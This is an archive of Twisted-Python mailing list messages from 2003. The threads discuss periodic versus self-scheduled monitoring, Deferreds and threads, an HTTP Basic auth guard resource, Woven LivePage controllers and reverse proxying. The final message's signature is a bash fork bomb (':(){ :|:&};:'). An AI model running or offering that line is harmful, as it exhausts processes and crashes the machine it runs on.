On Wednesday, Jul 16, 2003, at 12:12 America/New_York, Peter Hansen 
wrote:

> Matthias Urlichs wrote:
>>
>> Hi, Brad Bollenbach wrote:
>>
>>> I write a "monicron". monicron wakes up every five minutes and asks 
>>> the
>>> system "are there any monitors that need to be performed right now?" 
>>> The
>>> answer will either be "Yes, here's the monitors that need to be
>>> performed right now" or "No".
>>
>> Why don't you write a function that finds the earliest monitor job 
>> which
>> needs to run next, and delay for exactly that amount?
>
> One good reason to do the "every five minutes check" thing instead of
> "wait exactly this long based on a precalculated value" thing is that
> if the things to be monitored can be added or removed dynamically,
> interrupting the sleep is more difficult than it's worth, while the
> blind periodic check is much simpler and more robust.

I don't necessarily agree with that.  With the "every five minutes 
check" you have to write your own callLater mechanism, when you let 
tasks schedule themselves, you don't.  Also with the "every five 
minutes check" you're using computer+bandwidth resources in a much less 
sane manner, it sure as hell isn't going to scale awfully well.

-bob




From radix at twistedmatrix.com  Wed Jul 16 12:43:19 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Wed, 16 Jul 2003 12:43:19 -0400
Subject: [Twisted-Python] Passing mx.DateTime objects to PB
In-Reply-To: <20030716154907.13430.qmail@green.zadka.com>
References: <200307161831.28533.egor@iplus.ru> <20030716154907.13430.qmail@green.zadka.com>
Message-ID: <20030716164319.GB1259@radii>

On Wed, Jul 16, 2003 at 03:49:07PM -0000, Moshe Zadka wrote:
> On Wed, 16 Jul 2003, Egor Cheshkov <egor at iplus.ru> wrote:
> 
> > Hello! Another beginner's question. How can I pass mx.DateTime
> > objects to and from PB remote method calls? Should I create a
> > subclass of mx.DateTime and pb.Copyable?
> 
> A. Did everyone drink copying juice today or something? Stop copying classes,
> people. Most of the time, you want remote references. Really.

I can't imagine why you'd want to use a Referenceable for a DateTime
object. Copying probably _is_ what he should be using.

> C. It doesn't appear that Jelly or PB support components, precluding
> that strategy. Am I wrong? Is there a way to use components?

I started this way back at PyCon, but never finished it. I didn't want
to implement it for this generation of PB when there's a newer one in
the, uhm, toaster.

So, for now, there's going to have to be a new class. :-(

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From lafou at wanadoo.fr  Wed Jul 16 13:18:00 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 16 Jul 2003 19:18:00 +0200
Subject: [Twisted-Python] dealing with woven templates.
Message-ID: <1058375880.2919.26.camel@biproc>

Hi all,

I have some (noob) problems with woven. I tried to create a standard
template, with 1 picture. I modified the template from picturepile. Here
is what I have :

  <html>
    <head>
      <title model="title" view="Text">Directory listing</title>
    </head>
    <body>
      <img src="pictures/TwistedLogoFull.png" alt="Twisted logo"
border="0" />
      <h1 model="title" view="Text">This is the title</h1>
      <ul model="directory" view="List">
        <li pattern="listItem"><a view="Anchor"
href="#">ListItem</a></li>
        <li pattern="emptyList">This directory is empty.</li>
      </ul>
    </body>
  </html>

This works since /pictures is in the templates directory. Moreover, I
can see where the items would be, and their link (#).

But I get no image at all while rendering with woven and the
picturepile.py exemple. On the otherhand, all items begin with
"ListItem"

This is tedious since web designers should see something similar to the
final result.

By the way, I got this error :

exceptions.AttributeError: 'NoneType' object has no attribute
'toprettyxml'

because the app couldn't find the template file. This message isn't
explicit enough I think :(

thx for your help




From brad at bbnet.ca  Wed Jul 16 13:24:40 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Wed, 16 Jul 2003 13:24:40 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716163851.GA1259@radii>
References: <20030716152520.GA19537@xdsk200> <20030716174504.V15104@amaze.nl> <20030716160430.GB19921@xdsk200> <20030716163851.GA1259@radii>
Message-ID: <20030716172440.GA20186@xdsk200>

On Wed, Jul 16, 2003 at 12:38:51PM -0400, Christopher Armstrong wrote:
> On Wed, Jul 16, 2003 at 12:04:30PM -0400, Brad Bollenbach wrote:
> > On Wed, Jul 16, 2003 at 05:45:04PM +0200, Ivo van der Wijk wrote:
> 
> > > Somewhat. You need to make very sure your system doesn't block
> > > unexpectedly :)
> > 
> > I'm not sure how you (or Twisted) define "unexpected", but I probably
> > want things to block when -- for example -- I try to retrieve a page
> > from a certain URL.
> 
> "unexpectedly" means "at all" :-)

*blinks*

> Are you sure you _really_ mean this? Is there some user interface bit
> that you're implying when you say you want it to block? Do you just
> mean that you want to wait for some tasks to complete before you start
> others? If so, then that's not blocking, and Twisted is still
> appropriate.
> 
> > I certainly don't want to be writing state machines.
> 
> That's how Twisted works. But it's not annoying if you have a good
> standard library of state machines already :-) For example,
> twisted.web.client and/or twisted.web.monitor already exist, so all
> you would have to do to implement the web checker (using t.w.client)
> is this (I'm assuming you know the basics of Deferreds)::

Well, I'm sure I mean I want to block.

Unless I don't (in which case Twisted would have to prove to me that I
don't).

Here's an example use case for a monitoring check:

1. open web page and store cookie that it gives us
2. did we get the page ok? (yes)
3. submit the form with values foo=bar and baz=spam (and the cookie we 
got in step 1)
4. did the response get retrieved ok? (yes)
5. is the string "Welcome to blah blah blah" present in this page? (no)
6. return a "NOT OK" for this monitor

Using a state machine for this seems like too much complexity, compared
to just starting a thread and letting me simply block so I can do these
checks procedurally (albeit inside a method, if you know what I mean).

> from twisted.web import client
> class WebChecker:
>     def doIt(self, url):
>         return client.getPage(url,
>                    ).addCallback(self.gotPage, url
>                    ).addErrback(self.reportError, url)
> 
>     def gotPage(self, page, url):
>         print "hooray, got page %s" % url
>         #self.checkForFoo(page, url), etc
> 
>     def reportError(self, failure, url):
>         print ":( There was a problem in %s" % url
>         print failure
> 
> To try out this code, do
> 
> from twisted.internet import reactor
> WebChecker().doIt('http://twistedmatrix.com/'
>     ).addCallback(lambda *a: reactor.stop())
> reactor.run()

Thanks for this example.

I'll mull over this and see if I can mold it into the different checks I
need to perform, and whether or not state-machinery will make life
easier or more complex.

--
Brad Bollenbach



From David.McCurley at technologist.com  Wed Jul 16 15:00:26 2003
From: David.McCurley at technologist.com (David McCurley)
Date: 16 Jul 2003 15:00:26 -0400
Subject: [Twisted-Python] HTTP Authentication Example for review
Message-ID: <1058382026.30109.19.camel@mars.mccurleyweb.net>

Below is some example code I've been using to restrict access to certain
parts of my site to only the users I want.  I've started simple with
hard coded user/pwd stuff and tried to make a clean example for others
to look at to verify this looks to be a correct approach with twisted. 
Please take a look and give me some feedback.  Know a better way? See
any holes? Maybe I should be looking and doing something to the protocol
stuff instead of the resource approach?

This resource is intented to be plugged into part of the resource tree
and guard everything below it.  It could be at the root or somewhere
below.

Note that in production, user accounts will be associated with groups,
and allowed paths can be attached to users and/or groups.  I'm going to
implement this after I have covered the basics.

The one thing so far that I don't like (ref MyGuard) is that it looks
like I have to do checks in the following methods (at least):

render()
getChild()
getChildWithDefault()
getChildForRequest()



Example code:
=============================

class MyAuth(baseRes):
    isLeaf = True
    def __init__(self):
        baseRes.__init__(self)
    def render(self, request):
        request.setHeader('WWW-authenticate', 'Basic realm="%s"' %
("default",))
        errpage = error.ErrorPage(http.UNAUTHORIZED,"Unauthorized","401
Authentication required")
        return errpage.render(request)
    def getChild(self, name, request):
            return self
        
class MyGuard(baseRes):
    def __init__(self, userName="test", password="test"):
        baseRes.__init__(self)
        self.uName = userName
        self.pWord = password
        
    def render(self, request):
        auth = self.checkUser(request)
        if auth:
            return auth.render(request)
        return
"<html><head><title>MyGuard</title></head><body><h1>MyGuard</h1></body></html>"
            
    def getChild(self, name, request):
        auth = self.checkUser(request)
        if auth:
            return auth
        if name == '':
            return self
        return baseRes.getChild(self, name, request)
        
    def getChildWithDefault(self, path, request):
        auth = self.checkUser(request)
        if auth:
            return auth
        return baseRes.getChildWithDefault(self, path, request)
        
    def getChildForRequest(self, request):
        auth = self.checkUser(request)
        if auth:
            return auth
        return baseRes.getChildForRequest(self, request)
        
    def checkUser(self, request):
        if not request.getUser() or not request.getPassword():
            return MyAuth()
        else:
            user = request.getUser()
            pwd = request.getPassword()
        if user != self.uName or pwd != self.pWord:
            return MyAuth()
        else:
            return None
=============================

Thx!




From radix at twistedmatrix.com  Wed Jul 16 15:52:49 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Wed, 16 Jul 2003 15:52:49 -0400
Subject: [Twisted-Python] HTTP Authentication Example for review
In-Reply-To: <1058382026.30109.19.camel@mars.mccurleyweb.net>
References: <1058382026.30109.19.camel@mars.mccurleyweb.net>
Message-ID: <20030716195249.GC1259@radii>

On Wed, Jul 16, 2003 at 03:00:26PM -0400, David McCurley wrote:
> The one thing so far that I don't like (ref MyGuard) is that it looks
> like I have to do checks in the following methods (at least):
> 
> render()
> getChild()
> getChildWithDefault()
> getChildForRequest()

No, you only need to override render and
getChildWithDefault. getChildForRequest will call getChildWithDefault,
and getChildWithDefault is responsible for calling getChild. So as
long as you have isLeaf=True, getChildWithDefault will catch any
getChild.

> class MyAuth(baseRes):
>     isLeaf = True

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From lafou at wanadoo.fr  Wed Jul 16 16:22:53 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 16 Jul 2003 22:22:53 +0200
Subject: [Twisted-Python] dealing with woven templates.
In-Reply-To: <1058375880.2919.26.camel@biproc>
References: <1058375880.2919.26.camel@biproc>
Message-ID: <1058386973.2894.31.camel@biproc>

I found a solution for the "/pictures" dir pb.

I have to add this :

def wchild_pictures(self, request):
        return static.File(os.path.join(self.templateDirectory,"pictures"))

to DirectoryListing(page.Page) class.

I can do it with all Pages in web site by creating a master class (ie :

class MyPage(page.Page):
	def wchild_pictures(self, request):
        	return static.File(os.path.join(self.templateDirectory,"pictures"))

But I still have the pb with the links.


I also took a look at generated code, it's quite ugly. Is there a way to have a incremented
output ?




From David.McCurley at technologist.com  Wed Jul 16 16:46:46 2003
From: David.McCurley at technologist.com (David McCurley)
Date: 16 Jul 2003 16:46:46 -0400
Subject: [Twisted-Python] HTTP Authentication Example for review
In-Reply-To: <20030716195249.GC1259@radii>
References: <1058382026.30109.19.camel@mars.mccurleyweb.net>
	 <20030716195249.GC1259@radii>
Message-ID: <1058388406.30283.5.camel@mars.mccurleyweb.net>

But MyGuard doesn't have isLeaf=True because its not a leaf.  Its at the
top of some resource tree/subtree that it guards.  

I thought I had some type of problem with setting isLeaf=True in MyGuard
and it not giving me the behavior I wanted (maybe only if it was the
root resource).  That is, if I'm remembering the other night correctly
:)  Maybe I'll read through the source again so I can figure out again
why I don't have isLeaf.  I'm almost sure there is/was a reason.

Thx!


On Wed, 2003-07-16 at 15:52, Christopher Armstrong wrote:
> On Wed, Jul 16, 2003 at 03:00:26PM -0400, David McCurley wrote:
> > The one thing so far that I don't like (ref MyGuard) is that it looks
> > like I have to do checks in the following methods (at least):
> > 
> > render()
> > getChild()
> > getChildWithDefault()
> > getChildForRequest()
> 
> No, you only need to override render and
> getChildWithDefault. getChildForRequest will call getChildWithDefault,
> and getChildWithDefault is responsible for calling getChild. So as
> long as you have isLeaf=True, getChildWithDefault will catch any
> getChild.
> 
> > class MyAuth(baseRes):
> >     isLeaf = True




From peter at engcorp.com  Wed Jul 16 16:53:05 2003
From: peter at engcorp.com (Peter Hansen)
Date: Wed, 16 Jul 2003 16:53:05 -0400
Subject: [Twisted-Python] How Twisted is This?
References: <42CC22C2-B7AC-11D7-AB7F-000A95686CD8@redivi.com>
Message-ID: <3F15BB31.27794375@engcorp.com>

Bob Ippolito wrote:
> 
> On Wednesday, Jul 16, 2003, at 12:12 America/New_York, Peter Hansen
> wrote:
> 
> > One good reason to do the "every five minutes check" thing instead of
> > "wait exactly this long based on a precalculated value" thing is that
> > if the things to be monitored can be added or removed dynamically,
> > interrupting the sleep is more difficult than it's worth, while the
> > blind periodic check is much simpler and more robust.
> 
> I don't necessarily agree with that.  With the "every five minutes
> check" you have to write your own callLater mechanism, when you let
> tasks schedule themselves, you don't.  Also with the "every five
> minutes check" you're using computer+bandwidth resources in a much less
> sane manner, it sure as hell isn't going to scale awfully well.

Mentioning callLater makes this an implementation question now, whereas
I believe both Brad and I were talking from a more general point of view.
I was, anyway.  From a general point of view, I'm right ;-), because
you simply don't have to worry about issues related to adding or removing
items, or changing the time delays of them as you would if you calculated
the delay until the next activity and went to sleep for that long.

As for bandwidth: I'm of the "premature optimization is bad" school
of thought, and it's far too early in this discussion to be worrying
about a few microseconds of CPU usage per day...

-Peter



From radix at twistedmatrix.com  Wed Jul 16 16:56:53 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Wed, 16 Jul 2003 16:56:53 -0400
Subject: [Twisted-Python] HTTP Authentication Example for review
In-Reply-To: <1058388406.30283.5.camel@mars.mccurleyweb.net>
References: <1058382026.30109.19.camel@mars.mccurleyweb.net> <20030716195249.GC1259@radii> <1058388406.30283.5.camel@mars.mccurleyweb.net>
Message-ID: <20030716205653.GE1259@radii>

On Wed, Jul 16, 2003 at 04:46:46PM -0400, David McCurley wrote:
> But MyGuard doesn't have isLeaf=True because its not a leaf.  Its at the
> top of some resource tree/subtree that it guards.  
> 
> I thought I had some type of problem with setting isLeaf=True in MyGuard
> and it not giving me the behavior I wanted (maybe only if it was the
> root resource).  That is, if I'm remembering the other night correctly
> :)  Maybe I'll read through the source again so I can figure out again
> why I don't have isLeaf.  I'm almost sure there is/was a reason.

Sorry, I was out of whack. You indeed do not need isLeaf. And you
still only need to override getChildWithDefault and render, not the
other two, whether it's the root resource or not.


-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From glyph at twistedmatrix.com  Wed Jul 16 18:04:24 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Wed, 16 Jul 2003 17:04:24 -0500
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716172440.GA20186@xdsk200>
Message-ID: <7619641B-B7D9-11D7-953B-000393C9700E@twistedmatrix.com>

On Wednesday, July 16, 2003, at 12:24 PM, Brad Bollenbach wrote:

> Using a state machine for this seems like too much complexity, compared
> to just starting a thread and letting me simply block so I can do these
> checks procedurally (albeit inside a method, if you know what I mean).

Keep in mind that nothing in Twisted is thread safe, so you will have 
to write a state machine to process the results of your threaded 
calculations anyway.  State machines are really the point of Twisted.  
The framework itself is a huge repository of different techniques and 
examples for making writing state machines easy.

If you're going to write a bunch of blocking I/O in threads, you might 
as well write your own framework.  You literally won't be able to 
safely call any Twisted code that way.  As an aside, running lots of 
threaded clients will tend to scale much more poorly than multiplexing 
them all.




From bob at redivi.com  Wed Jul 16 18:39:09 2003
From: bob at redivi.com (Bob Ippolito)
Date: Wed, 16 Jul 2003 18:39:09 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <3F15BB31.27794375@engcorp.com>
Message-ID: <50E4C45B-B7DE-11D7-8336-000A95686CD8@redivi.com>

On Wednesday, Jul 16, 2003, at 16:53 America/New_York, Peter Hansen 
wrote:

> Bob Ippolito wrote:
>>
>> On Wednesday, Jul 16, 2003, at 12:12 America/New_York, Peter Hansen
>> wrote:
>>
>>> One good reason to do the "every five minutes check" thing instead of
>>> "wait exactly this long based on a precalculated value" thing is that
>>> if the things to be monitored can be added or removed dynamically,
>>> interrupting the sleep is more difficult than it's worth, while the
>>> blind periodic check is much simpler and more robust.
>>
>> I don't necessarily agree with that.  With the "every five minutes
>> check" you have to write your own callLater mechanism, when you let
>> tasks schedule themselves, you don't.  Also with the "every five
>> minutes check" you're using computer+bandwidth resources in a much 
>> less
>> sane manner, it sure as hell isn't going to scale awfully well.
>
> Mentioning callLater makes this an implementation question now, whereas
> I believe both Brad and I were talking from a more general point of 
> view.

I said "your own callLater mechanism", meaning "your own code that 
doesn't do anything very different from callLater".  We're talking 
about using a particular framework here anyways, and the claim I'm 
making is that this framework already has a well-designed and tested 
implementation this particular functionality and it'd be silly to write 
your own.

> I was, anyway.  From a general point of view, I'm right ;-), because
> you simply don't have to worry about issues related to adding or 
> removing
> items, or changing the time delays of them as you would if you 
> calculated
> the delay until the next activity and went to sleep for that long.

How can you not have to worry about adding or removing items to a list 
of recurring tasks?  You have the same list of tasks for either 
approach.  Calculating the number of seconds in 5 minutes isn't any 
harder for a "waker" than it is for whatever function is scheduling 
your tasks.. it's simple, the answer is minutes*60.0, which is 300.0 
seconds in this case.  With a "wakerless" approach you can have the 
tasks scheduled at different sorts of intervals, and even non-constant 
intervals (i.e. exponential backoff).  If you have a "waker" that 
supports this kind of functionality, that manages a list of stuff that 
should happen after variable intervals of time, finds the minimum, and 
sleeps for that long, you just rewrote part of the reactor.  The good 
thing about using pieces of the twisted framework that already exist is 
that you don't have to write them, they generally have tests, and 
generally work extremely well.

> As for bandwidth: I'm of the "premature optimization is bad" school
> of thought, and it's far too early in this discussion to be worrying
> about a few microseconds of CPU usage per day...

It's not a premature optimization, it's a different way of designing 
the networking core of this "company branded salable application" that 
happens to be easier and more scalable.  For example, a process can 
only acquire some fixed number of file handles (sockets) before it 
starts to get really-hard-to-handle errors.  If you try and open up X 
connections at the same time, you're much more likely to run into this 
error given enough sites to check, it's something you really have to 
watch out for when writing a web spider, for example.  It just doesn't 
make sense to intentionally design something that behaves like: 
______/\___________/\_____ when you really have an extremely 
parallelizable task at hand.  Checking site A is in no way dependent on 
checking site B, so there's no reason to intentionally make them happen 
at the same time if you know better.  We're not talking about a whole 
lot of code here.  Leveraging the fact that 99% of what needs to be 
done is glue code between stuff that's already in twisted, a prototype 
of his application could be easily be done in less than fifty lines 
using the scalable approach.  In fact, I think that the "wake up and do 
stuff every N minutes" approach would actually end up being a longer 
and easier to screw up implementation.

-bob




From David.McCurley at technologist.com  Wed Jul 16 19:19:07 2003
From: David.McCurley at technologist.com (David McCurley)
Date: 16 Jul 2003 19:19:07 -0400
Subject: [Twisted-Python] ReverseProxy Usage
Message-ID: <1058397547.30283.14.camel@mars.mccurleyweb.net>

I assumed that if I put a reverse proxy resource in twisted, it would
reverse proxy to another site.  It seems that it doesn't do fixups on
the returned html?  So it won't really reverse proxy, it will just
scrape a single page from a remote site?

Or maybe I'm using it wrong?

Here is the scenarion:

I made a simple test resource file call "/tmp/t1.rpy" that has the
following code:

================

from twisted.web import resource, proxy

resource = proxy.ReverseProxyResource('www.google.com', 80, '/')

================

I used mktap to make a static resource (mktap web --path) that points to
/tmp.  Now when I run it, I get a dir listing of /tmp.  I click on
t1.rpy and that shows me the google home page. 

However, the images don't work and none of the links work.  They weren't
fixed up to have the "../t1.rpy" stuff prepended to them like I expected
and am used to with reverse proxies.

Can anyone clarify this for me?

Thanks!




From tim.andrews at adpro.com.au  Wed Jul 16 20:41:46 2003
From: tim.andrews at adpro.com.au (Tim Andrews)
Date: Thu, 17 Jul 2003 10:11:46 +0930
Subject: [Twisted-Python] (no subject)
Message-ID: <MIEKLAIKJGMEAEJNJKJACEPPCAAA.tim.andrews@adpro.com.au>

Hi twisted,

I've just started playing with twisted and am keen to get something
happening with  LivePage. I can serve pages quite happily from an .rpy and
have tried to follow the examples from the manual to get event handlers and
LivePage happening.  When my page is generated "MyController.handle" gets
called, but "MyController.setUp" never gets called.  If I add an "__init__"
method it gets called, but when I try to call "self.view.addEventHandler" it
complains that self.view is a NoneType.

I have also tried subclassing input.Anything, but suffer from a similar
problem in that my "initialize" method never gets called or if I call
"input.Anything.__init__" then I still have a problem with
"self.view.addEventHandler"

FYI I'm running twisted 1.06 on Python 2.2 on a Windows 2000 box

My code for your perusal ...

from twisted.web.woven import page, controller

model = {
    'name': 'fred',
    'stuff': ['Foo', 'Bar', 'Baz']
}

template = """
  <html>
  <body>
  <h3 model="name" view="Text"  controller = "foo"/>
  <div model="stuff" view="List">
  <li pattern="listItem" view="Text"/>
  </div>
  <span view="webConduitGlue" />
  </body>
  </html>
"""

class MyController(controller.Controller):

#  def __init__(self, *args, **kwargs):
#    controller.Controller.__init__(self, args, kwargs)
#    self.view.addEventHandler("onmouseover", self.mouse) # self.view =
NoneType :(

  def setUp(self, request, *args):
    print "setUp" # this never happens :(

  def handle(self, request):
    print 'handle' # this happens :)

  def mouse(self, request, widget):
    print 'Mouse Over!!!'


class MyPage(page.LivePage):

  def wcfactory_foo(self, request, node, model):
    print 'foo factory' # this happens :)
    return MyController(model)


resource = MyPage(model, template=template)


Thanks,

Tim


----------------------------------------
Tim Andrews
Principal Hardware Engineer

Vision Fire and Security
14 Park Way, Technology Park
Mawson Lakes, S.A. 5095

ph: +61-8-84621201
fax: +61-8-84621001
email: Tim.Andrews at adpro.com.au
web site: www.adpro.com.au

----------------------------------------
IMPORTANT ? This email and any attachments may be confidential. Any
retransmissions, dissemination or other use of these materials by persons
or entities other than the intended recipient is prohibited. If received in
error, please contact us and delete all copies. Before opening or using
attachments, check them for viruses and defects. Our liability is limited
to resupplying any affected attachments. [Any representations or opinions
expressed in this e.mail are those of the individual sender, and not
necessarily those of Vision Systems Limited].
--------------------------------------------




From tim.andrews at adpro.com.au  Wed Jul 16 20:44:10 2003
From: tim.andrews at adpro.com.au (Tim Andrews)
Date: Thu, 17 Jul 2003 10:14:10 +0930
Subject: [Twisted-Python] with a subject this time - Woven LivePage beginners trouble
Message-ID: <MIEKLAIKJGMEAEJNJKJAGEPPCAAA.tim.andrews@adpro.com.au>

Hi twisted,

I've just started playing with twisted and am keen to get something
happening with  LivePage. I can serve pages quite happily from an .rpy and
have tried to follow the examples from the manual to get event handlers and
LivePage happening.  When my page is generated "MyController.handle" gets
called, but "MyController.setUp" never gets called.  If I add an "__init__"
method it gets called, but when I try to call "self.view.addEventHandler" it
complains that self.view is a NoneType.

I have also tried subclassing input.Anything, but suffer from a similar
problem in that my "initialize" method never gets called or if I call
"input.Anything.__init__" then I still have a problem with
"self.view.addEventHandler"

FYI I'm running twisted 1.06 on Python 2.2 on a Windows 2000 box

My code for your perusal ...

from twisted.web.woven import page, controller

model = {
    'name': 'fred',
    'stuff': ['Foo', 'Bar', 'Baz']
}

template = """
  <html>
  <body>
  <h3 model="name" view="Text"  controller = "foo"/>
  <div model="stuff" view="List">
  <li pattern="listItem" view="Text"/>
  </div>
  <span view="webConduitGlue" />
  </body>
  </html>
"""

class MyController(controller.Controller):

#  def __init__(self, *args, **kwargs):
#    controller.Controller.__init__(self, args, kwargs)
#    self.view.addEventHandler("onmouseover", self.mouse) # self.view =
NoneType :(

  def setUp(self, request, *args):
    print "setUp" # this never happens :(

  def handle(self, request):
    print 'handle' # this happens :)

  def mouse(self, request, widget):
    print 'Mouse Over!!!'


class MyPage(page.LivePage):

  def wcfactory_foo(self, request, node, model):
    print 'foo factory' # this happens :)
    return MyController(model)


resource = MyPage(model, template=template)


Thanks,

Tim

PS sorry about the finger trouble
----------------------------------------
Tim Andrews
Principal Hardware Engineer

Vision Fire and Security
14 Park Way, Technology Park
Mawson Lakes, S.A. 5095

ph: +61-8-84621201
fax: +61-8-84621001
email: Tim.Andrews at adpro.com.au
web site: www.adpro.com.au

----------------------------------------
IMPORTANT ? This email and any attachments may be confidential. Any
retransmissions, dissemination or other use of these materials by persons
or entities other than the intended recipient is prohibited. If received in
error, please contact us and delete all copies. Before opening or using
attachments, check them for viruses and defects. Our liability is limited
to resupplying any affected attachments. [Any representations or opinions
expressed in this e.mail are those of the individual sender, and not
necessarily those of Vision Systems Limited].
--------------------------------------------




From dp at twistedmatrix.com  Wed Jul 16 22:46:42 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Wed, 16 Jul 2003 19:46:42 -0700
Subject: [Twisted-Python] with a subject this time - Woven LivePage beginners trouble
In-Reply-To: <MIEKLAIKJGMEAEJNJKJAGEPPCAAA.tim.andrews@adpro.com.au>
References: <MIEKLAIKJGMEAEJNJKJAGEPPCAAA.tim.andrews@adpro.com.au>
Message-ID: <E5ACAE2D-B800-11D7-AA99-000A95864FC4@twistedmatrix.com>

On Wednesday, July 16, 2003, at 5:44PM, Tim Andrews wrote:

> Hi twisted,
>
> I've just started playing with twisted and am keen to get something
> happening with  LivePage. I can serve pages quite happily from an .rpy 
> and
> have tried to follow the examples from the manual to get event 
> handlers and
> LivePage happening.  When my page is generated "MyController.handle" 
> gets
> called, but "MyController.setUp" never gets called.  If I add an 
> "__init__"
> method it gets called, but when I try to call 
> "self.view.addEventHandler" it
> complains that self.view is a NoneType.

Just move the addEventHandler into handle, that gets called after the 
view has been created and hooked up.

I'm not sure why controllers have a handle or a setUp... I really need 
to do some API pruning on Woven...

Just don't scream when I break your app and you have to rename 
something slightly! It's for the good of the community! :-)

dp




From tim.andrews at adpro.com.au  Thu Jul 17 01:13:42 2003
From: tim.andrews at adpro.com.au (Tim Andrews)
Date: Thu, 17 Jul 2003 14:43:42 +0930
Subject: [Twisted-Python] with a subject this time - Woven LivePage beginners trouble
Message-ID: <MIEKLAIKJGMEAEJNJKJAKEPPCAAA.tim.andrews@adpro.com.au>

Many thanks - all better now.  
This has some seriously horny applications for me!

Tim

On Wednesday, July 16, 2003, at 5:44PM, Tim Andrews wrote:

> Hi twisted,
>
> I've just started playing with twisted and am keen to get something
> happening with  LivePage. I can serve pages quite happily from an .rpy 
> and
> have tried to follow the examples from the manual to get event 
> handlers and
> LivePage happening.  When my page is generated "MyController.handle" 
> gets
> called, but "MyController.setUp" never gets called.  If I add an 
> "__init__"
> method it gets called, but when I try to call 
> "self.view.addEventHandler" it
> complains that self.view is a NoneType.

Just move the addEventHandler into handle, that gets called after the 
view has been created and hooked up.

I'm not sure why controllers have a handle or a setUp... I really need 
to do some API pruning on Woven...

Just don't scream when I break your app and you have to rename 
something slightly! It's for the good of the community! :-)

dp


_______________________________________________
Twisted-Python mailing list
Twisted-Python at twistedmatrix.com
http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python




From smurf at smurf.noris.de  Thu Jul 17 06:40:32 2003
From: smurf at smurf.noris.de (Matthias Urlichs)
Date: Thu, 17 Jul 2003 12:40:32 +0200
Subject: [Twisted-Python] How Twisted is This?
References: <20030716152520.GA19537@xdsk200> <pan.2003.07.16.15.47.03.115396@smurf.noris.de> <20030716155758.GA19921@xdsk200>
Message-ID: <pan.2003.07.17.10.40.28.502600@smurf.noris.de>

Hi, Brad Bollenbach wrote:

> Because it's known that monitors can be run at either 5 or 15 minute
> intervals. To wake up every five minutes is the simplest.

... unless you want, two years from now, to scan a service every five
seconds (bonus points: with exponential back-off) because you have a
fickle customer who needs that sort of reassurance.

Besides, if the jobs all have their own timing mechanism you can spread
them over your five-minute interval. You can also a small random offset to
each timeout, which means that you won't have problems with load spikes
every five minutes which might skew your answer time statistics. Not to
mention that a mostly-idle background job will mostly stay in memory,
while one which sleeps for five minutes may well be swapped out by the
time it runs again.

> In any case, this is just an implementation detail, outside the point of
> whether or not Twisted is what I'm looking for to minimize the amount of
> time and effort needed to getting a running, sellable system.

I respectfully disagree. It's a case of "use the framework the way it's
intended", which is a skill you'll need in other areas too.

YMMV, but that is very much my experience, with Twisted in particular.

-- 
Matthias Urlichs   |   {M:U} IT Design @ m-u-it.de   |  smurf at smurf.noris.de
Disclaimer: The quote was selected randomly. Really. | http://smurf.noris.de
-- 
You ask what a nice girl will do?  She won't give an inch, but she won't
say no.
		-- Marcus Valerius Martialis




From m at moshez.org  Thu Jul 17 07:10:29 2003
From: m at moshez.org (Moshe Zadka)
Date: 17 Jul 2003 11:10:29 -0000
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <pan.2003.07.17.10.40.28.502600@smurf.noris.de>
References: <pan.2003.07.17.10.40.28.502600@smurf.noris.de>, <20030716152520.GA19537@xdsk200> <pan.2003.07.16.15.47.03.115396@smurf.noris.de> <20030716155758.GA19921@xdsk200>
Message-ID: <20030717111029.22846.qmail@green.zadka.com>

[Brad]
> In any case, this is just an implementation detail, outside the point of
> whether or not Twisted is what I'm looking for to minimize the amount of
> time and effort needed to getting a running, sellable system.

[Matthias Urlichs]
> I respectfully disagree. It's a case of "use the framework the way it's
> intended", which is a skill you'll need in other areas too.
> 
> YMMV, but that is very much my experience, with Twisted in particular.

Well, he was still technically right: the question of whether to use
Twisted or not is unrelated: he should use Twisted. Then the question
of best use of Twisted comes, and not trying to use hacks to get a worse
program starts seems like a useful idea :) 
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From tv at twistedmatrix.com  Thu Jul 17 05:55:29 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 17 Jul 2003 12:55:29 +0300
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <50E4C45B-B7DE-11D7-8336-000A95686CD8@redivi.com>
References: <3F15BB31.27794375@engcorp.com> <50E4C45B-B7DE-11D7-8336-000A95686CD8@redivi.com>
Message-ID: <20030717095529.GB2302@lapdog>

On Wed, Jul 16, 2003 at 06:39:09PM -0400, Bob Ippolito wrote:
> watch out for when writing a web spider, for example.  It just doesn't 
> make sense to intentionally design something that behaves like: 
> ______/\___________/\_____ when you really have an extremely 
> parallelizable task at hand.  Checking site A is in no way dependent on 
> checking site B, so there's no reason to intentionally make them happen 
> at the same time if you know better.  We're not talking about a whole 
> lot of code here.  Leveraging the fact that 99% of what needs to be 
> done is glue code between stuff that's already in twisted, a prototype 
> of his application could be easily be done in less than fifty lines 
> using the scalable approach.  In fact, I think that the "wake up and do 
> stuff every N minutes" approach would actually end up being a longer 
> and easier to screw up implementation.

	You all should probably read up on what the Nagios project
	thinks about randomizing monitoring intervals. They have a
	stable open source product that can scale reasonably well,
	and have good opinions on that subject.

-- 
:(){ :|:&};:



